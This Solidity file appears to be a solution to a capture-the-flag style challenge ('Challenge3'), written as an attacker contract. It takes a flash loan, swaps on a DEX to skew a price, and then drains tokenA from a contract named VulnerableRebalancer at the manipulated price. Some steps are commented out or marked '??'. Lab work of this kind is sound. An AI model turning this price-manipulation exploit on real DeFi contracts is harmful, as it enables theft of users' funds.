// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// interface of contract FlahLoanPool.sol
interface IFlashLoanPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

// interface of contract SimpleDEX.sol
interface ISimpleDEX {
    function swap(address tokenIn, uint256 amountIn) external;
}

// interface of contract VulnerableRebalancer.sol
interface IVulnerableRebalancer {
    function initializeTreasury(uint256 amountA, uint256 amountB) external;
    function getPrice() external returns (uint256);
    function getTreasuryValue() external returns (uint256);
    function swapAForB(uint256 amountIn) external;
    function swapBForA(uint256 amountIn) external;
}

contract Challenge3 {
    using SafeERC20 for IERC20;

    IFlashLoanPool public pool;
    ISimpleDEX public dex;
    IVulnerableRebalancer public rebalancer;
    address public tokenA;
    address public tokenB;

    constructor(
        address _pool,
        address _dex,
        address _rebalancer,
        address _tokenA,
        address _tokenB
    ) {
        pool = IFlashLoanPool(_pool);
        dex = ISimpleDEX(_dex);
        rebalancer = IVulnerableRebalancer(_rebalancer);
        tokenA = _tokenA;
        tokenB = _tokenB;
    }

    // 1. start the attack
    function attack(address token, uint256 amount) external {
        pool.flashLoan(token, amount, "");
    }

    // 2. The callback function the pool calls during flashLoan
    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
        uint256 quantityA = IERC20(tokenA).balanceOf(address(rebalancer));
        // uint256 quantityB = IERC20(tokenB).balanceOf(address(rebalancer));

        IERC20(token).approve(address(dex), amount);
        dex.swap(token, amount);

        uint256 price = rebalancer.getPrice();

        IERC20(tokenB).approve(address(rebalancer), quantityA * price / 1e18); // ??
        rebalancer.swapBForA(quantityA * price / 1e18);

        //IERC20(tokenB).approve(address(dex), IERC20(tokenB).balanceOf(address(this)));
        //dex.swap(token, IERC20(tokenB).balanceOf(address(this)));

        IERC20(token).safeTransfer(msg.sender, amount);
    }
}